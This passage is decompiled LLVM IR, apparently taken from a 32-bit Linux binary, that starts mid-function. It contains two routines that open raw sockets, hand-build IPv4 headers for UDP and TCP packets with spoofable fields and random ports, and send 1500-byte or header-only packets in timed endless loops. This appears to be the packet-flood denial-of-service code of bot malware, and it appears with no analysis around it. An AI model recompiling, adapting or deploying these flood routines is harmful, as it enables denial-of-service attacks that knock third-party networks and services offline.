  %v2_80493e6 = call i32 @function_80482b2(i32 %v0_80493d5, i32 ptrtoint ([33 x i8]* @global_var_805299c.48 to i32))
  store i32 %v2_80493e6, i32* @eax, align 4
  %v1_80493f3 = call i32 @function_804eec4(i32 0)
  br label %dec_label_pc_80493f8

dec_label_pc_80493f8:                             ; preds = %dec_label_pc_80493be, %dec_label_pc_80493d5
  %v1_80493fb = add i32 %v1_80493c4, 12
  %v2_80493fb = inttoptr i32 %v1_80493fb to i32*
  %v3_80493fb = load i32, i32* %v2_80493fb, align 4
  %v1_8049408 = add i32 %v1_80493c4, 16
  %v2_8049408 = inttoptr i32 %v1_8049408 to i32*
  %v3_8049408 = load i32, i32* %v2_8049408, align 4
  %v1_804940b = inttoptr i32 %v3_8049408 to i32*
  %v2_804940b = load i32, i32* %v1_804940b, align 4
  %v3_8049413 = call i32 @function_804d2dc(i32 %v2_804940b, i32 ptrtoint (i32* @global_var_8056500.47 to i32), i32 %v3_80493fb)
  %v0_804941b.pre = load i32, i32* @global_var_8056500.47, align 256
  br label %dec_label_pc_804941b

dec_label_pc_804941b:                             ; preds = %dec_label_pc_804939b, %dec_label_pc_80493f8
  %v0_804941b = phi i32 [ %v1_80493a7, %dec_label_pc_804939b ], [ %v0_804941b.pre, %dec_label_pc_80493f8 ]
  ret i32 %v0_804941b

; uselistorder directives
  uselistorder i32 %v1_80493a7, { 1, 0, 2 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_804941b, { 1, 0 }
  uselistorder label %dec_label_pc_80493f8, { 1, 0 }
}

define i32 @function_8049422(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8049422:
  %tmp21 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-1532 = alloca i32, align 4
  %stack_var_-1540 = alloca i32, align 4
  %stack_var_-1560 = alloca i32, align 4
  %stack_var_-1612 = alloca i32, align 4
  %stack_var_-1604 = alloca i32, align 4
  %v2_8049437 = call i32 @function_804b6d0(i32* null)
  store i32 %v2_8049437, i32* @eax, align 4
  %v1_8049448 = call i32 @function_8048309(i32 %arg2)
  %v1_8049450 = icmp eq i32 %v1_8049448, 0
  %v1_8049452 = icmp eq i1 %v1_8049450, false
  br i1 %v1_8049452, label %dec_label_pc_80496ac, label %dec_label_pc_8049458

dec_label_pc_8049458:                             ; preds = %dec_label_pc_8049422
  %v3_8049464 = call i32 @function_804da00(i32 2, i32 3, i32 255)
  store i32 %v3_8049464, i32* @eax, align 4
  %v5_804946f = icmp slt i32 %v3_8049464, 0
  %v1_8049473 = icmp eq i1 %v5_804946f, false
  br i1 %v1_8049473, label %dec_label_pc_804947f, label %dec_label_pc_8049475

dec_label_pc_8049475:                             ; preds = %dec_label_pc_8049458
  %v1_804947a = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_804947f

dec_label_pc_804947f:                             ; preds = %dec_label_pc_8049458, %dec_label_pc_8049475
  %v4_804947f = add i32 %arg3, -2
  %v9_804947f = sub i32 1, %arg3
  %v10_804947f = and i32 %v9_804947f, %arg3
  %v11_804947f = icmp slt i32 %v10_804947f, 0
  %v12_804947f = icmp eq i32 %v4_804947f, 0
  %v13_804947f = icmp slt i32 %v4_804947f, 0
  %v3_8049483 = icmp eq i1 %v13_804947f, %v11_804947f
  %v4_8049483 = icmp eq i1 %v12_804947f, false
  %v5_8049483 = and i1 %v4_8049483, %v3_8049483
  br i1 %v5_8049483, label %dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge, label %dec_label_pc_8049485

dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge: ; preds = %dec_label_pc_804947f
  br label %dec_label_pc_80494a5

dec_label_pc_8049485:                             ; preds = %dec_label_pc_804947f
  store i32 %arg2, i32* %stack_var_-1604, align 4
  store i32 %arg1, i32* %stack_var_-1612, align 4
  %v3_8049493 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_80529c0.49 to i32))
  store i32 %v3_8049493, i32* @eax, align 4
  store i32 1, i32* %stack_var_-1612, align 4
  %v1_80494a0 = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_80494a5

dec_label_pc_80494a5:                             ; preds = %dec_label_pc_804947f.dec_label_pc_80494a5_crit_edge, %dec_label_pc_8049485
  %v1_80494a8 = add i32 %arg4, 4
  %v1_80494ab = inttoptr i32 %v1_80494a8 to i32*
  %v2_80494ab = load i32, i32* %v1_80494ab, align 4
  store i32 %arg2, i32* %stack_var_-1612, align 4
  %v3_80494b4 = call i32 @function_804939b(i32 %arg2, i32 %v2_80494ab)
  %v1_80494c2 = add i32 %arg4, 8
  %v1_80494c5 = inttoptr i32 %v1_80494c2 to i32*
  %v2_80494c5 = load i32, i32* %v1_80494c5, align 4
  store i32 %v2_80494c5, i32* %stack_var_-1612, align 4
  %v1_80494cb = call i32 @function_804ed7c(i32 %v2_80494c5)
  %v1_80494d9 = add i32 %arg4, 12
  %v1_80494dc = inttoptr i32 %v1_80494d9 to i32*
  %v2_80494dc = load i32, i32* %v1_80494dc, align 4
  store i32 %v2_80494dc, i32* %stack_var_-1612, align 4
  %v1_80494e2 = call i32 @function_804ed7c(i32 %v2_80494dc)
  %v2_80494ed = ptrtoint i32* %stack_var_-1560 to i32
  %tmp54 = bitcast i32* %stack_var_-1540 to i16*
  %v15_8049508 = ptrtoint i32* %stack_var_-1532 to i32
  store i32 1472, i32* %stack_var_-1604, align 4
  store i32 %v15_8049508, i32* %stack_var_-1612, align 4
  %v4_804951b = bitcast i32* %stack_var_-1532 to i8*
  %v5_804951b = call i32 @function_804d178(i8* %v4_804951b, i32 10, i32 1472)
  store i32 %arg2, i32* %stack_var_-1604, align 4
  store i32 %arg1, i32* %stack_var_-1612, align 4
  %v3_8049537 = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([26 x i8]* @global_var_80529e7.50 to i32))
  %v3_804954a = bitcast i32* %stack_var_-1560 to i8*
  store i8 69, i8* %v3_804954a, align 4
  %v1_804955c = or i32 %v2_80494ed, 1
  %v2_804955c = inttoptr i32 %v1_804955c to i8*
  store i8 0, i8* %v2_804955c, align 1
  %v1_8049563 = or i32 %v2_80494ed, 2
  %v2_8049563 = inttoptr i32 %v1_8049563 to i16*
  store i16 1500, i16* %v2_8049563, align 2
  %v1_804956c = add i32 %v2_80494ed, 6
  %v2_804956c = inttoptr i32 %v1_804956c to i16*
  store i16 0, i16* %v2_804956c, align 2
  %v1_8049575 = add i32 %v2_80494ed, 9
  %v2_8049575 = inttoptr i32 %v1_8049575 to i8*
  store i8 17, i8* %v2_8049575, align 1
  %v1_804957c = add i32 %v2_80494ed, 8
  %v2_804957c = inttoptr i32 %v1_804957c to i8*
  store i8 64, i8* %v2_804957c, align 4
  %v2_8049586 = add i32 %v2_80494ed, 16
  %v3_8049586 = inttoptr i32 %v2_8049586 to i32*
  store i32 %v3_80494b4, i32* %v3_8049586, align 4
  %v1_804958c = urem i32 %tmp21, 65536
  store i32 %v1_804958c, i32* %stack_var_-1612, align 4
  %v1_8049595 = call i32 @function_804d410(i32 %v1_804958c)
  %v2_8049595 = trunc i32 %v1_8049595 to i16
  %v4_804959f = ptrtoint i32* %stack_var_-1540 to i32
  %v3_80495a2 = add i32 %v4_804959f, 4
  %v4_80495a2 = inttoptr i32 %v3_80495a2 to i16*
  store i16 %v2_8049595, i16* %v4_80495a2, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i32 %v3_80494b4, i32* @eax, align 4
  %v4_80495bf = icmp eq i32 %v1_80494cb, 0
  %v3_80495ee = or i32 %v4_804959f, 2
  %v4_80495ee = inttoptr i32 %v3_80495ee to i16*
  %v2_80495fe = bitcast i32* %stack_var_-1560 to i16*
  %v3_804960b = add i32 %v4_804959f, 6
  %v4_804960b = inttoptr i32 %v3_804960b to i16*
  %v2_8049619 = add i32 %v2_80494ed, 12
  %v3_8049619 = inttoptr i32 %v2_8049619 to i32*
  %v3_8049626 = add i32 %v2_80494ed, 4
  %v4_8049626 = inttoptr i32 %v3_8049626 to i16*
  %v3_8049643 = add i32 %v2_80494ed, 10
  %v4_8049643 = inttoptr i32 %v3_8049643 to i16*
  %v2_8049652 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804968c = add i32 %v1_80494e2, %v2_8049437
  %v1_80495c8 = urem i32 %v1_80494cb, 65536
  br label %dec_label_pc_80495b2

dec_label_pc_80495b2:                             ; preds = %dec_label_pc_80496a4, %dec_label_pc_80494a5
  %stack_var_-40.0 = phi i32 [ 0, %dec_label_pc_80494a5 ], [ %v4_80496a4, %dec_label_pc_80496a4 ]
  %v1_80495b2 = call i32 @function_804e9f8(i32 %v3_80494b4)
  %sext = mul i32 %v1_80495b2, 65536
  %v1_80495b7 = sdiv i32 %sext, 65536
  store i32 %v4_804959f, i32* @eax, align 4
  %v1_80495bc = trunc i32 %v1_80495b7 to i16
  store i16 %v1_80495bc, i16* %tmp54, align 4
  br i1 %v4_80495bf, label %dec_label_pc_80495e4, label %dec_label_pc_80495c5

dec_label_pc_80495c5:                             ; preds = %dec_label_pc_80495b2
  store i32 %v1_80495c8, i32* %stack_var_-1612, align 4
  %v1_80495d1 = call i32 @function_804d410(i32 %v1_80495c8)
  br label %dec_label_pc_80495f2

dec_label_pc_80495e4:                             ; preds = %dec_label_pc_80495b2
  %v0_80495e4 = load i32, i32* %stack_var_-1612, align 4
  %v1_80495e4 = call i32 @function_804e9f8(i32 %v0_80495e4)
  %sext5 = mul i32 %v1_80495e4, 65536
  %v1_80495e9 = sdiv i32 %sext5, 65536
  br label %dec_label_pc_80495f2

dec_label_pc_80495f2:                             ; preds = %dec_label_pc_80495c5, %dec_label_pc_80495e4
  %storemerge.in = phi i32 [ %v1_80495e9, %dec_label_pc_80495e4 ], [ %v1_80495d1, %dec_label_pc_80495c5 ]
  %storemerge = trunc i32 %storemerge.in to i16
  store i16 %storemerge, i16* %v4_80495ee, align 2
  store i32 %v2_80494ed, i32* %stack_var_-1604, align 4
  %v3_80495fe = call i32 @function_80488bc(i16* %v2_80495fe, i32 1500)
  %v4_80495fe = trunc i32 %v3_80495fe to i16
  store i16 %v4_80495fe, i16* %v4_804960b, align 2
  %v0_804960f = call i32 @function_80483e8()
  store i32 %v2_80494ed, i32* @eax, align 4
  store i32 %v0_804960f, i32* %v3_8049619, align 4
  %v0_804961c = load i32, i32* %stack_var_-1604, align 4
  %v1_804961c = call i32 @function_804e9f8(i32 %v0_804961c)
  %sext4 = mul i32 %v1_804961c, 65536
  %v1_8049621 = sdiv i32 %sext4, 65536
  %v1_8049626 = trunc i32 %v1_8049621 to i16
  store i16 %v1_8049626, i16* %v4_8049626, align 4
  store i32 %v2_80494ed, i32* %stack_var_-1604, align 4
  %v3_8049636 = call i32 @function_80488bc(i16* %v2_80495fe, i32 1500)
  %v4_8049636 = trunc i32 %v3_8049636 to i16
  store i16 %v4_8049636, i16* %v4_8049643, align 2
  store i32 %v2_8049652, i32* %stack_var_-1612, align 4
  %v7_804966c = call i32 @function_804d980(i32 %v3_8049464, i32 %v2_80494ed, i32 1500, i32 0, i32 %v2_8049652, i32 16)
  store i32 %v7_804966c, i32* @eax, align 4
  %tmp55 = icmp ult i32 %stack_var_-40.0, 50
  br i1 %tmp55, label %dec_label_pc_80496a4, label %dec_label_pc_804967a

dec_label_pc_804967a:                             ; preds = %dec_label_pc_80495f2
  store i32 0, i32* %stack_var_-1612, align 4
  %v2_804967f = call i32 @function_804b6d0(i32* null)
  store i32 %v5_804968c, i32* @eax, align 4
  %v7_804968f = icmp ult i32 %v2_804967f, %v5_804968c
  br i1 %v7_804968f, label %dec_label_pc_80496a4, label %dec_label_pc_8049693

dec_label_pc_8049693:                             ; preds = %dec_label_pc_804967a
  store i32 0, i32* %stack_var_-1612, align 4
  %v1_8049698 = call i32 @function_804eec4(i32 0)
  store i32 %v1_8049698, i32* @eax, align 4
  br label %dec_label_pc_80496a4

dec_label_pc_80496a4:                             ; preds = %dec_label_pc_8049693, %dec_label_pc_804967a, %dec_label_pc_80495f2
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.0, %dec_label_pc_80495f2 ], [ 0, %dec_label_pc_804967a ], [ 0, %dec_label_pc_8049693 ]
  %v4_80496a4 = add i32 %stack_var_-40.1, 1
  br label %dec_label_pc_80495b2

dec_label_pc_80496ac:                             ; preds = %dec_label_pc_8049422
  ret i32 %v1_8049448

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v4_804959f, { 2, 0, 1, 3 }
  uselistorder i32 %v2_80494ed, { 10, 11, 3, 12, 0, 1, 2, 4, 5, 6, 7, 8, 9 }
  uselistorder i32 %v2_80494dc, { 1, 0 }
  uselistorder i32 %v2_80494c5, { 1, 0 }
  uselistorder i32 %v4_804947f, { 1, 0 }
  uselistorder i32* %stack_var_-1604, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32* %stack_var_-1612, { 1, 2, 3, 0, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %stack_var_-1560, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_80495f2, { 1, 0 }
  uselistorder label %dec_label_pc_80494a5, { 1, 0 }
  uselistorder label %dec_label_pc_804947f, { 1, 0 }
}

define i32 @function_80496ae(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_80496ae:
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-124 = alloca i32, align 4
  %stack_var_-84 = alloca i16, align 2
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-104 = alloca i8, align 1
  %stack_var_-252 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_8052a20.51 to i32), i32* %edx.global-to-local, align 4
  %v3_80496cd = bitcast i32* %stack_var_-252 to i16*
  %v4_80496cd = call i32 @function_804d150(i16* %v3_80496cd, i32 ptrtoint (i32* @global_var_8052a20.51 to i32), i32 80)
  %v2_80496e8 = call i32 @function_804b6d0(i32* null)
  store i32 %v2_80496e8, i32* @eax, align 4
  %v1_80496f9 = call i32 @function_8048309(i32 %arg2)
  %v1_8049701 = icmp eq i32 %v1_80496f9, 0
  %v1_8049703 = icmp eq i1 %v1_8049701, false
  br i1 %v1_8049703, label %dec_label_pc_8049a6c, label %dec_label_pc_8049709

dec_label_pc_8049709:                             ; preds = %dec_label_pc_80496ae
  %v4_8049709 = add i32 %arg3, -2
  %v9_8049709 = sub i32 1, %arg3
  %v10_8049709 = and i32 %v9_8049709, %arg3
  %v11_8049709 = icmp slt i32 %v10_8049709, 0
  %v12_8049709 = icmp eq i32 %v4_8049709, 0
  %v13_8049709 = icmp slt i32 %v4_8049709, 0
  %v3_804970d = icmp eq i1 %v13_8049709, %v11_8049709
  %v4_804970d = icmp eq i1 %v12_8049709, false
  %v5_804970d = and i1 %v4_804970d, %v3_804970d
  br i1 %v5_804970d, label %dec_label_pc_804972f, label %dec_label_pc_804970f

dec_label_pc_804970f:                             ; preds = %dec_label_pc_8049709
  %v2_804971d = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([39 x i8]* @global_var_8052a70.52 to i32))
  store i32 %v2_804971d, i32* @eax, align 4
  %v1_804972a = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_804972f

dec_label_pc_804972f:                             ; preds = %dec_label_pc_8049709, %dec_label_pc_804970f
  %v3_804973b = call i32 @function_804da00(i32 2, i32 3, i32 255)
  store i32 %v3_804973b, i32* @eax, align 4
  %v5_8049746 = icmp slt i32 %v3_804973b, 0
  %v1_804974a = icmp eq i1 %v5_8049746, false
  br i1 %v1_804974a, label %dec_label_pc_8049773.preheader, label %dec_label_pc_804974c

dec_label_pc_804974c:                             ; preds = %dec_label_pc_804972f
  %v1_8049751 = call i32 @function_804eec4(i32 1)
  br label %dec_label_pc_8049773.preheader

dec_label_pc_8049773.preheader:                   ; preds = %dec_label_pc_804972f, %dec_label_pc_804974c
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_8049773.preheader, %dec_label_pc_804975f
  %storemerge88 = phi i32 [ 0, %dec_label_pc_8049773.preheader ], [ %v4_8049770, %dec_label_pc_804975f ]
  store i32 %storemerge88, i32* @edx, align 4
  %v0_8049765 = load i32, i32* @ebp, align 4
  %v2_8049765 = mul nuw nsw i32 %storemerge88, 4
  %v3_8049765 = add nuw nsw i32 %v2_8049765, -248
  %v4_8049765 = add i32 %v3_8049765, %v0_8049765
  %v5_8049765 = inttoptr i32 %v4_8049765 to i32*
  %v6_8049765 = load i32, i32* %v5_8049765, align 4
  %v1_804976c = trunc i32 %v6_8049765 to i8
  %v4_804976c = add nuw nsw i32 %storemerge88, -60
  %v5_804976c = add i32 %v4_804976c, %v0_8049765
  %v6_804976c = inttoptr i32 %v5_804976c to i8*
  store i8 %v1_804976c, i8* %v6_804976c, align 1
  %v4_8049770 = add nuw nsw i32 %storemerge88, 1
  %exitcond = icmp eq i32 %v4_8049770, 20
  br i1 %exitcond, label %dec_label_pc_8049779, label %dec_label_pc_804975f

dec_label_pc_8049779:                             ; preds = %dec_label_pc_804975f
  %v1_804977c = add i32 %arg4, 4
  %v1_804977f = inttoptr i32 %v1_804977c to i32*
  %v2_804977f = load i32, i32* %v1_804977f, align 4
  %v3_8049788 = call i32 @function_804939b(i32 %arg2, i32 %v2_804977f)
  %v1_8049796 = add i32 %arg4, 12
  %v1_8049799 = inttoptr i32 %v1_8049796 to i32*
  %v2_8049799 = load i32, i32* %v1_8049799, align 4
  %v1_804979f = call i32 @function_804ed7c(i32 %v2_8049799)
  %v3_80497be = call i32 @function_80482b2(i32 %arg1, i32 ptrtoint ([24 x i8]* @global_var_8052a97.53 to i32))
  store i8 69, i8* %stack_var_-104, align 1
  %v1_8049863 = add i32 %arg4, 8
  %v1_8049866 = inttoptr i32 %v1_8049863 to i32*
  %v2_8049866 = load i32, i32* %v1_8049866, align 4
  %v1_804986c = call i32 @function_804ed7c(i32 %v2_8049866)
  %v1_8049874 = urem i32 %v1_804986c, 65536
  %v1_804987d = call i32 @function_804d410(i32 %v1_8049874)
  %v1_8049885 = urem i32 %v1_804987d, 65536
  store i32 %v1_8049885, i32* @eax, align 4
  %v5_804988a = trunc i32 %v1_804987d to i16
  %v2_804992b = ptrtoint i8* %stack_var_-104 to i32
  %v2_80499b9 = ptrtoint i32* %stack_var_-156 to i32
  %v2_80499bf = ptrtoint i32* %stack_var_-144 to i32
  %v15_80499c5 = ptrtoint i16* %stack_var_-84 to i32
  %v12_80499e3 = ptrtoint i32* %stack_var_-124 to i32
  %v15_80499ea = ptrtoint i32* %stack_var_-64 to i32
  %v2_8049a10 = ptrtoint i32* %stack_var_-172 to i32
  %v5_8049a4c = add i32 %v1_804979f, %v2_80496e8
  br label %dec_label_pc_804988d

dec_label_pc_804988d:                             ; preds = %dec_label_pc_8049a64, %dec_label_pc_8049779
  %stack_var_-32.0 = phi i16 [ %v5_804988a, %dec_label_pc_8049779 ], [ %stack_var_-32.1, %dec_label_pc_8049a64 ]
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_8049779 ], [ %v4_8049a64, %dec_label_pc_8049a64 ]
  %v1_804988d = sext i16 %stack_var_-32.0 to i32
  %v2_804988d = call i32 @function_804e9f8(i32 %v1_804988d)
  %v3_804988d = trunc i32 %v2_804988d to i16
  %v2_804989b = load i32, i32* %v1_8049866, align 4
  %v0_804989d = load i32, i32* @esp, align 4
  %v2_80498a0 = add i32 %v0_804989d, -16
  %v3_80498a0 = inttoptr i32 %v2_80498a0 to i32*
  store i32 %v2_804989b, i32* %v3_80498a0, align 4
  %sext11 = mul i32 %v2_804988d, 65536
  %v1_80498a1 = sdiv i32 %sext11, 65536
  %v2_80498a1 = call i32 @function_804ed7c(i32 %v1_80498a1)
  store i32 %v2_80498a1, i32* @eax, align 4
  %v1_80498a9 = icmp eq i32 %v2_80498a1, 0
  %v1_80498ab = icmp eq i1 %v1_80498a9, false
  br i1 %v1_80498ab, label %dec_label_pc_80498b5, label %dec_label_pc_80498ad

dec_label_pc_80498ad:                             ; preds = %dec_label_pc_804988d
  %v2_80498ad = call i32 @function_804e9f8(i32 %v1_80498a1)
  %v3_80498ad = trunc i32 %v2_80498ad to i16
  br label %dec_label_pc_80498b5

dec_label_pc_80498b5:                             ; preds = %dec_label_pc_804988d, %dec_label_pc_80498ad
  %stack_var_-32.1 = phi i16 [ %stack_var_-32.0, %dec_label_pc_804988d ], [ %v3_80498ad, %dec_label_pc_80498ad ]
  %v0_80498b5 = call i32 @function_80483e8()
  %v0_80498c8 = load i32, i32* @esp, align 4
  %v2_80498cb = add i32 %v0_80498c8, -16
  %v3_80498cb = inttoptr i32 %v2_80498cb to i32*
  store i32 60, i32* %v3_80498cb, align 4
  %v1_80498cc = call i32 @function_804d410(i32 %v0_80498b5)
  store i32 %v1_80498cc, i32* @eax, align 4
  %sext13 = mul i32 %v1_80498cc, 65536
  %v1_80498d8 = sdiv i32 %sext13, 65536
  %v2_80498d8 = call i32 @function_804e9f8(i32 %v1_80498d8)
  store i16 %v3_804988d, i16* %stack_var_-84, align 2
  %v4_80498fa = sext i16 %stack_var_-32.1 to i32
  store i32 %v4_80498fa, i32* @eax, align 4
  %sext15 = mul i32 %v2_80498d8, 65536
  %v1_8049901 = sdiv i32 %sext15, 65536
  %v2_8049901 = call i32 @function_804e9f8(i32 %v1_8049901)
  store i32 2, i32* %stack_var_-172, align 4
  %v0_804992e = load i32, i32* @esp, align 4
  %v1_804992e = add i32 %v0_804992e, -4
  %v2_804992e = inttoptr i32 %v1_804992e to i32*
  store i32 20, i32* %v2_804992e, align 4
  %v2_8049930 = add i32 %v0_804992e, -8
  %v3_8049930 = inttoptr i32 %v2_8049930 to i32*
  store i32 %v2_804992b, i32* %v3_8049930, align 4
  %v0_8049931 = load i32, i32* %stack_var_-172, align 4
  %v3_8049931 = inttoptr i32 %v0_8049931 to i16*
  %v4_8049931 = call i32 @function_80488bc(i16* %v3_8049931, i32 %v4_80498fa)
  store i32 %v4_8049931, i32* @eax, align 4
  %sext16 = mul i32 %v4_8049931, 65536
  %v1_804993d = sdiv i32 %sext16, 65536
  %v2_804993d = call i32 @function_804e9f8(i32 %v1_804993d)
  store i32 %v0_80498b5, i32* %stack_var_-156, align 4
  %v0_80499a6 = load i32, i32* @esp, align 4
  %v2_80499a9 = add i32 %v0_80499a6, -16
  %v3_80499a9 = inttoptr i32 %v2_80499a9 to i32*
  store i32 40, i32* %v3_80499a9, align 4
  %sext24 = mul i32 %v2_804993d, 16777216
  %v1_80499aa = sdiv i32 %sext24, 16777216
  %v2_80499aa = call i32 @function_804d410(i32 %v1_80499aa)
  %v0_80499af = load i32, i32* @esp, align 4
  store i32 %v2_80499bf, i32* %edx.global-to-local, align 4
  %v1_80499cb = add i32 %v0_80499af, 8
  %v2_80499cb = inttoptr i32 %v1_80499cb to i32*
  store i32 20, i32* %v2_80499cb, align 4
  %v2_80499cd = add i32 %v0_80499af, 4
  %v3_80499cd = inttoptr i32 %v2_80499cd to i32*
  store i32 %v2_80499bf, i32* %v3_80499cd, align 4
  %v3_80499ce = inttoptr i32 %v0_80499af to i32*
  store i32 %v15_80499c5, i32* %v3_80499ce, align 4
  %sext17 = mul i32 %v2_80499aa, 65536
  %v1_80499cf = sdiv i32 %sext17, 65536
  %v4_80499cf = call i32 @function_804d2dc(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499d4 = load i32, i32* @esp, align 4
  %v5_80499da = add i32 %v0_80499d4, 8
  %v6_80499da = inttoptr i32 %v5_80499da to i32*
  store i32 20, i32* %v6_80499da, align 4
  %v2_80499e6 = add i32 %v0_80499d4, 4
  %v3_80499e6 = inttoptr i32 %v2_80499e6 to i32*
  store i32 %v12_80499e3, i32* %v3_80499e6, align 4
  %v3_80499ed = inttoptr i32 %v0_80499d4 to i32*
  store i32 %v15_80499ea, i32* %v3_80499ed, align 4
  %v4_80499ee = call i32 @function_804d2dc(i32 %v1_80499cf, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_80499f3 = load i32, i32* @esp, align 4
  store i32 %v2_80499b9, i32* %edx.global-to-local, align 4
  %v2_8049a02 = add i32 %v0_80499f3, 12
  %v3_8049a02 = inttoptr i32 %v2_8049a02 to i32*
  store i32 52, i32* %v3_8049a02, align 4
  %v2_8049a03 = add i32 %v0_80499f3, 8
  %v3_8049a03 = inttoptr i32 %v2_8049a03 to i32*
  store i32 %v2_80499b9, i32* %v3_8049a03, align 4
  %v3_8049a04 = inttoptr i32 %v1_80499cf to i16*
  %v4_8049a04 = call i32 @function_80488bc(i16* %v3_8049a04, i32 ptrtoint (i32* @0 to i32))
  %v0_8049a09 = load i32, i32* @esp, align 4
  store i32 60, i32* %edx.global-to-local, align 4
  %v1_8049a1f = add i32 %v0_8049a09, -4
  %v2_8049a1f = inttoptr i32 %v1_8049a1f to i32*
  store i32 16, i32* %v2_8049a1f, align 4
  %v2_8049a21 = add i32 %v0_8049a09, -8
  %v3_8049a21 = inttoptr i32 %v2_8049a21 to i32*
  store i32 %v2_8049a10, i32* %v3_8049a21, align 4
  %v1_8049a22 = add i32 %v0_8049a09, -12
  %v2_8049a22 = inttoptr i32 %v1_8049a22 to i32*
  store i32 0, i32* %v2_8049a22, align 4
  %v0_8049a24 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049a24 = add i32 %v0_8049a09, -16
  %v3_8049a24 = inttoptr i32 %v2_8049a24 to i32*
  store i32 %v0_8049a24, i32* %v3_8049a24, align 4
  %v2_8049a28 = add i32 %v0_8049a09, -20
  %v3_8049a28 = inttoptr i32 %v2_8049a28 to i32*
  store i32 %v2_804992b, i32* %v3_8049a28, align 4
  %v5_8049a29 = add i32 %v0_8049a09, -24
  %v6_8049a29 = inttoptr i32 %v5_8049a29 to i32*
  store i32 %v3_804973b, i32* %v6_8049a29, align 4
  %v1_8049a2c = load i32, i32* %stack_var_-64, align 4
  %sext20 = mul i32 %v4_8049a04, 65536
  %v2_8049a2c = sdiv i32 %sext20, 65536
  %v7_8049a2c = call i32 @function_804d980(i32 %v2_8049a2c, i32 %v1_8049a2c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v7_8049a2c, i32* @eax, align 4
  %tmp90 = icmp ult i32 %stack_var_-44.0, 50
  br i1 %tmp90, label %dec_label_pc_8049a64, label %dec_label_pc_8049a3a

dec_label_pc_8049a3a:                             ; preds = %dec_label_pc_80498b5
  %v0_8049a31 = load i32, i32* @esp, align 4
  %v1_8049a3d = add i32 %v0_8049a31, 16
  %v2_8049a3d = inttoptr i32 %v1_8049a3d to i32*
  store i32 0, i32* %v2_8049a3d, align 4
  %v2_8049a3f = inttoptr i32 %v2_8049a2c to i32*
  %v3_8049a3f = call i32 @function_804b6d0(i32* %v2_8049a3f)
  %v0_8049a44 = load i32, i32* @esp, align 4
  store i32 %v3_8049a3f, i32* %edx.global-to-local, align 4
  store i32 %v5_8049a4c, i32* @eax, align 4
  %v7_8049a4f = icmp ult i32 %v3_8049a3f, %v5_8049a4c
  br i1 %v7_8049a4f, label %dec_label_pc_8049a64, label %dec_label_pc_8049a53

dec_label_pc_8049a53:                             ; preds = %dec_label_pc_8049a3a
  %v2_8049a56 = inttoptr i32 %v0_8049a44 to i32*
  store i32 0, i32* %v2_8049a56, align 4
  %v2_8049a58 = call i32 @function_804eec4(i32 %v2_8049a2c)
  store i32 %v2_8049a58, i32* @eax, align 4
  br label %dec_label_pc_8049a64

dec_label_pc_8049a64:                             ; preds = %dec_label_pc_8049a53, %dec_label_pc_8049a3a, %dec_label_pc_80498b5
  %stack_var_-44.1 = phi i32 [ %stack_var_-44.0, %dec_label_pc_80498b5 ], [ 0, %dec_label_pc_8049a3a ], [ 0, %dec_label_pc_8049a53 ]
  %v4_8049a64 = add i32 %stack_var_-44.1, 1
  br label %dec_label_pc_804988d

dec_label_pc_8049a6c:                             ; preds = %dec_label_pc_80496ae
  ret i32 %v1_80496f9

; uselistorder directives
  uselistorder i32 %v2_8049a2c, { 2, 1, 0 }
  uselistorder i32 %v0_80499d4, { 1, 0, 2 }
  uselistorder i32 %v1_80499cf, { 2, 1, 0 }
  uselistorder i32 %v0_80499af, { 2, 0, 1 }
  uselistorder i16 %stack_var_-32.1, { 1, 0 }
  uselistorder i32 %v1_80498a1, { 1, 0 }
  uselistorder i32 %stack_var_-44.0, { 1, 0 }
  uselistorder i32 %v1_804987d, { 1, 0 }
  uselistorder i32 %storemerge88, { 2, 3, 0, 1 }
  uselistorder i32 %v4_8049709, { 1, 0 }
  uselistorder i32 %v1_80496f9, { 1, 0 }
  uselistorder i16* %stack_var_-84, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_80498b5, { 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0 }
  uselistorder label %dec_label_pc_8049773.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_804972f, { 1, 0 }
}

